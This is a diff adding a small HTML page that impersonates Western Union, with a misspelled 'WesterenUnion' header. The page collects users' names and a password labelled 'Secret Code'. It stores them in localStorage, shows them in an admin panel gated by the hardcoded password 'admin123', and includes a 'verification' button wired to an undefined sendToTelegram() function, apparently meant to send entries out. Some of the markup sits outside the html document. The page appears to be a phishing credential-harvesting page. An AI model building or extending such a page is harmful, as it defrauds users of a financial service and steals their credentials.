@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدارة بيانات Western Union</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; direction: rtl; }
+        .container { width: 300px; margin: auto; padding: 20px; }
+        input, button { width: 90%; margin: 10px 0; padding: 10px; font-size: 16px; }
+        .admin-section { display: none; margin-top: 20px; }
+        ul { list-style: none; padding: 0; }
+        li { background: #f2f2f2; padding: 10px; margin: 5px 0; }
+    </style>
+</head>
+<body>
+
+    
+
+    <div class="admin-section" id="adminPanel">
+        <h3>البيانات المخزنة:</h3>
+        <ul id="userList"></ul>
+    </div>
+
+    <script>
+        function saveData() {
+            let firstName = document.getElementById("firstName").value;
+            let lastName = document.getElementById("lastName").value;
+            let password = document.getElementById("password").value;
+
+            if (firstName && lastName && password) {
+                let users = JSON.parse(localStorage.getItem("WesternUnionData")) || [];
+                users.push({ firstName, lastName, password });
+                localStorage.setItem("WesternUnionData", JSON.stringify(users));
+
+                alert("تم حفظ البيانات!");
+            } else {
+                alert("يرجى ملء جميع الحقول.");
+            }
+        }
+
+        function adminLogin() {
+            let password = prompt("أدخل كلمة المرور لعرض البيانات:");
+
+            if (password === "admin123") { // يمكنك تغيير كلمة المرور هنا
+                document.getElementById("adminPanel").style.display = "block";
+                displayUsers();
+            } else {
+                alert("كلمة المرور غير صحيحة!");
+            }
+        }
+
+        function displayUsers() {
+            let users = JSON.parse(localStorage.getItem("WesternUnionData")) || [];
+            let userList = document.getElementById("userList");
+            userList.innerHTML = "";
+
+            users.forEach((user, index) => {
+                let li = document.createElement("li");
+                li.textContent = `${user.firstName} ${user.lastName} - ****`;
+                userList.appendChild(li);
+            });
+        }
+    </script>
+
+</body>
+</html>
+<div class="header">WesterenUnion</div>
+<input type="text" id="firstName" placeholder="First Name">
+<input type="text" id="lastName" placeholder="Last Name">
+<input type="password" id="password" placeholder="Secret Code">
+<button onclick="sendToTelegram()">verification</button>
+
+<div class="header">Western Union</div>
